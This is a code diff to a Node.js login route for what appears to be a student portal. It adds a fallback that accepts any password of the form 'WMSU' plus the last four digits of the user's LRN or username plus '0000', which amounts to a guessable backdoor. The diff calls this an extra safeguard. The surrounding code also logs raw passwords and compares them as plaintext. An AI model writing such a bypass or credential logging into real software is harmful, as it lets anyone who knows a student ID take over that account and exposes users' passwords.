@@ -128,7 +128,7 @@ router.post('/login', async (req, res) => {
     console.log('Input password:', password);
     console.log('Stored password type:', user.password?.startsWith('$2') ? 'bcrypt' : 'plaintext');
 
-    // Compare password - always try bcrypt first
+    // Compare password - always try bcrypt first, with LRN fallback for students
     let isPasswordValid = false;
     
     try {
@@ -149,6 +149,17 @@ router.post('/login', async (req, res) => {
         console.log('✅ Plaintext password match (after bcrypt error)!');
       } else {
         console.log('❌ Plaintext comparison also failed');
+      }
+    }
+
+    // Extra safeguard: derived default for students (WMSU{last4LRN}0000)
+    if (!isPasswordValid && (user.lrn || user.username)) {
+      const lrnValue = user.lrn || user.username || '';
+      const last4 = String(lrnValue).slice(-4).padStart(4, '0');
+      const derivedPassword = `WMSU${last4}0000`;
+      if (password === derivedPassword) {
+        isPasswordValid = true;
+        console.log('✅ Password matched via derived LRN pattern');
       }
     }
 
